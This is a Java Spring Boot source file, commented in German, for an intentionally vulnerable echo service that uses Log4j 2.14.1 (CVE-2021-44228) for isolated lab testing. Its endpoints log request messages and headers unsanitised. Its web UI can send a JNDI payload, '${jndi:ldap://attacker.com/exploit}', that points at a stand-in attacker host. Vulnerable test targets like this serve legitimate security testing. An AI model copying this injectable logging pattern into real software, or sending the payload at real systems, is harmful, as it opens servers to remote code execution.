// VulnerableEchoService.java
// WARNUNG: Diese Anwendung enthält absichtlich die Log4j CVE-2021-44228 Vulnerability
// NUR für Testing/Demonstration in isolierten Umgebungen verwenden!

package com.loadtest.vulnerable;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import org.springframework.http.HttpStatus;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicLong;

@SpringBootApplication
@RestController
public class VulnerableEchoService {
    
    // Log4j Logger - VULNERABLE VERSION 2.14.1
    private static final Logger logger = LogManager.getLogger(VulnerableEchoService.class);
    
    private final AtomicLong requestCounter = new AtomicLong(0);
    
    public static void main(String[] args) {
        logger.info("🚨 Starting Vulnerable Echo Service - Log4j CVE-2021-44228");
        logger.warn("⚠️  THIS SERVICE CONTAINS INTENTIONAL VULNERABILITIES");
        SpringApplication.run(VulnerableEchoService.class, args);
    }
    
    // Web UI: input field + Echo button (calls /echo on the same origin).
    @GetMapping(value = "/", produces = "text/html")
    public String home() {
        long requestId = requestCounter.incrementAndGet();
        logger.info("UI home accessed - Request #{}", requestId);
        return ECHO_UI;
    }

    // Original service info kept as JSON at /info for API consumers.
    @GetMapping("/info")
    public ResponseEntity<Map<String, Object>> info() {
        Map<String, Object> response = new HashMap<>();
        response.put("service", "Vulnerable Echo Service");
        response.put("version", "1.0.0-VULNERABLE");
        response.put("vulnerability", "CVE-2021-44228");
        response.put("endpoints", new String[]{
            "GET / - Web UI",
            "GET /info - Service info (JSON)",
            "GET /health - Health check",
            "POST /echo - Echo message (VULNERABLE)",
            "GET /echo/{message} - Echo via GET (VULNERABLE)",
            "GET /echo?message=text - Echo via Query Parameter (VULNERABLE)"
        });
        response.put("timestamp", LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
        return ResponseEntity.ok(response);
    }

    private static final String ECHO_UI =
        "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
      + "<meta name='viewport' content='width=device-width, initial-scale=1'>"
      + "<title>Echo Service</title><style>"
      + "*{box-sizing:border-box;margin:0;padding:0}"
      + "body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;"
      + "background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);color:#e0e0e0;"
      + "min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}"
      + ".card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);"
      + "border-radius:14px;padding:32px;max-width:640px;width:100%;backdrop-filter:blur(10px)}"
      + "h1{color:#00d2ff;font-size:1.7em;text-shadow:0 0 18px rgba(0,210,255,.3)}"
      + ".sub{color:#f39c12;font-family:monospace;font-size:.85em;margin:6px 0 22px}"
      + "label{display:block;font-size:.85em;color:#8899a6;margin-bottom:6px;font-weight:600}"
      + "input[type=text]{width:100%;padding:12px 14px;background:rgba(255,255,255,.08);"
      + "border:1px solid rgba(255,255,255,.15);border-radius:8px;color:#e0e0e0;font-size:1em}"
      + "input[type=text]:focus{outline:none;border-color:#00d2ff;box-shadow:0 0 0 2px rgba(0,210,255,.2)}"
      + ".cb{display:flex;align-items:center;gap:8px;margin:16px 0;color:#e74c3c;font-size:.9em}"
      + ".cb input{width:auto}"
      + "button{margin-top:6px;padding:12px 26px;border:none;border-radius:8px;font-size:1em;"
      + "font-weight:600;cursor:pointer;background:linear-gradient(135deg,#00d2ff,#0083b0);color:#fff}"
      + "button:hover{filter:brightness(1.15)}"
      + "pre{margin-top:22px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08);"
      + "border-radius:8px;padding:16px;white-space:pre-wrap;word-break:break-word;"
      + "font-size:.85em;color:#7fe3ff;min-height:40px}"
      + ".big{color:#2ecc71;font-size:1.05em;font-weight:600}"
      + "</style></head><body><div class='card'>"
      + "<h1>&#128225; Echo Service</h1>"
      + "<div class='sub'>Log4j 2.14.1 &middot; CVE-2021-44228 &middot; lab use only</div>"
      + "<label for='msg'>Message to echo</label>"
      + "<input type='text' id='msg' placeholder='Type something and press Echo...' "
      + "value='Hello from the Echo UI' onkeydown='if(event.key===\"Enter\")doEcho()'>"
      + "<div class='cb'><input type='checkbox' id='vuln'>"
      + "<label for='vuln' style='margin:0;color:#e74c3c'>include Log4j JNDI payload (X-Log4j-Test header)</label></div>"
      + "<button onclick='doEcho()'>Echo</button>"
      + "<pre id='out'>Response will appear here.</pre>"
      + "</div><script>"
      + "function doEcho(){"
      + "var m=document.getElementById('msg').value||'Hello';"
      + "var h={};"
      + "if(document.getElementById('vuln').checked){h['X-Log4j-Test']='${jndi:ldap://attacker.com/exploit}';}"
      + "var out=document.getElementById('out');out.textContent='...';"
      + "fetch('/echo?message='+encodeURIComponent(m),{headers:h})"
      + ".then(function(r){return r.json();}).then(function(d){"
      + "out.innerHTML='<span class=\\'big\\'>Echoed: '+d.echoed_message+'</span>\\n\\n'"
      + "+JSON.stringify(d,null,2).replace(/</g,'&lt;');})"
      + ".catch(function(e){out.textContent='Error: '+e;});"
      + "}"
      + "</script></body></html>";
    
    @GetMapping("/health")
    public ResponseEntity<Map<String, Object>> health() {
        Map<String, Object> response = new HashMap<>();
        response.put("status", "UP");
        response.put("service", "vulnerable-echo-service");
        response.put("timestamp", LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
        
        logger.info("Health check performed");
        return ResponseEntity.ok(response);
    }
    
    @PostMapping("/echo")
    public ResponseEntity<Map<String, Object>> echoPost(@RequestBody(required = false) Map<String, Object> payload) {
        long requestId = requestCounter.incrementAndGet();
        
        String message = "";
        if (payload != null && payload.containsKey("message")) {
            message = payload.get("message").toString();
        } else {
            message = "No message provided";
        }
        
        // VULNERABLE: Direct logging von User Input - Log4j JNDI Injection möglich
        logger.info("Echo POST request #{} - Message: {}", requestId, message);
        
        Map<String, Object> response = new HashMap<>();
        response.put("echoed_message", message);
        response.put("method", "POST");
        response.put("request_id", requestId);
        response.put("timestamp", LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
        response.put("payload_received", payload);
        
        return ResponseEntity.ok(response);
    }
    
    @GetMapping("/echo/{message}")
    public ResponseEntity<Map<String, Object>> echoGet(
            @PathVariable String message,
            @RequestHeader(value = "User-Agent", defaultValue = "unknown") String userAgent,
            @RequestHeader(value = "X-Vulnerable-Header", defaultValue = "") String vulnerableHeader) {
        
        long requestId = requestCounter.incrementAndGet();
        
        // VULNERABLE: Path parameter und Headers werden direkt geloggt
        logger.info("Echo GET request #{} - Message: {}", requestId, message);
        logger.info("Echo GET request #{} - User-Agent: {}", requestId, userAgent);
        
        if (!vulnerableHeader.isEmpty()) {
            // VULNERABLE: Header wird direkt geloggt
            logger.info("Echo GET request #{} - Vulnerable Header: {}", requestId, vulnerableHeader);
        }
        
        Map<String, Object> response = new HashMap<>();
        response.put("echoed_message", message);
        response.put("method", "GET");
        response.put("path", "/echo/" + message);
        response.put("request_id", requestId);
        response.put("user_agent", userAgent);
        response.put("timestamp", LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
        
        if (!vulnerableHeader.isEmpty()) {
            response.put("vulnerable_header_received", vulnerableHeader);
        }
        
        return ResponseEntity.ok(response);
    }
    
    // NEU: GET /echo mit Query Parameter für bessere Kompatibilität
    @GetMapping("/echo")
    public ResponseEntity<Map<String, Object>> echoGetQuery(
            @RequestParam(value = "message", defaultValue = "Hello World") String message,
            @RequestParam(value = "method", defaultValue = "GET") String method,
            @RequestHeader(value = "User-Agent", defaultValue = "unknown") String userAgent,
            @RequestHeader(value = "X-Vulnerable-Header", defaultValue = "") String vulnerableHeader,
            @RequestHeader(value = "X-Log4j-Test", defaultValue = "") String log4jTest) {
        
        long requestId = requestCounter.incrementAndGet();
        
        // VULNERABLE: Query parameter und Headers werden direkt geloggt
        logger.info("Echo GET Query request #{} - Message: {}", requestId, message);
        logger.info("Echo GET Query request #{} - User-Agent: {}", requestId, userAgent);
        
        if (!vulnerableHeader.isEmpty()) {
            // VULNERABLE: Header wird direkt geloggt
            logger.info("Echo GET Query request #{} - Vulnerable Header: {}", requestId, vulnerableHeader);
        }
        
        if (!log4jTest.isEmpty()) {
            // VULNERABLE: Log4j Test Header wird direkt geloggt
            logger.info("Echo GET Query request #{} - Log4j Test: {}", requestId, log4jTest);
        }
        
        Map<String, Object> response = new HashMap<>();
        response.put("echoed_message", message);
        response.put("method", "GET-QUERY");
        response.put("query_params", Map.of("message", message, "method", method));
        response.put("request_id", requestId);
        response.put("user_agent", userAgent);
        response.put("timestamp", LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
        
        if (!vulnerableHeader.isEmpty()) {
            response.put("vulnerable_header_received", vulnerableHeader);
        }
        
        if (!log4jTest.isEmpty()) {
            response.put("log4j_test_received", log4jTest);
        }
        
        return ResponseEntity.ok(response);
    }
    
    // Fallback für alle anderen /echo/* Pfade
    @RequestMapping(value = "/echo/**", method = {RequestMethod.GET, RequestMethod.POST, RequestMethod.PUT, RequestMethod.DELETE})
    public ResponseEntity<Map<String, Object>> echoFallback(
            @RequestParam Map<String, String> queryParams,
            @RequestHeader Map<String, String> headers,
            @RequestBody(required = false) Object body) {
        
        long requestId = requestCounter.incrementAndGet();
        
        // VULNERABLE: Alle Parameter werden direkt geloggt
        logger.info("Echo Fallback request #{} - Query Params: {}", requestId, queryParams);
        logger.info("Echo Fallback request #{} - Headers: {}", requestId, headers);
        
        if (body != null) {
            logger.info("Echo Fallback request #{} - Body: {}", requestId, body);
        }
        
        Map<String, Object> response = new HashMap<>();
        response.put("message", "Echo Fallback - All requests welcome!");
        response.put("method", "FALLBACK");
        response.put("request_id", requestId);
        response.put("query_params", queryParams);
        response.put("received_headers", headers.size());
        response.put("has_body", body != null);
        response.put("timestamp", LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
        
        return ResponseEntity.ok(response);
    }
    
    // Error Handler für Method Not Allowed
    @ExceptionHandler(org.springframework.web.HttpRequestMethodNotSupportedException.class)
    public ResponseEntity<Map<String, Object>> handleMethodNotAllowed(
            org.springframework.web.HttpRequestMethodNotSupportedException ex) {
        
        long requestId = requestCounter.incrementAndGet();
        logger.warn("Method not allowed request #{} - {}", requestId, ex.getMessage());
        
        Map<String, Object> response = new HashMap<>();
        response.put("error", "Method Not Allowed");
        response.put("message", ex.getMessage());
        response.put("supported_methods", ex.getSupportedHttpMethods());
        response.put("request_id", requestId);
        response.put("timestamp", LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
        response.put("available_endpoints", new String[]{
            "GET / - Service info",
            "GET /health - Health check",
            "POST /echo - Echo with JSON body",
            "GET /echo/{message} - Echo with path parameter",
            "GET /echo?message=text - Echo with query parameter"
        });
        
        return ResponseEntity.status(HttpStatus.METHOD_NOT_ALLOWED).body(response);
    }
}
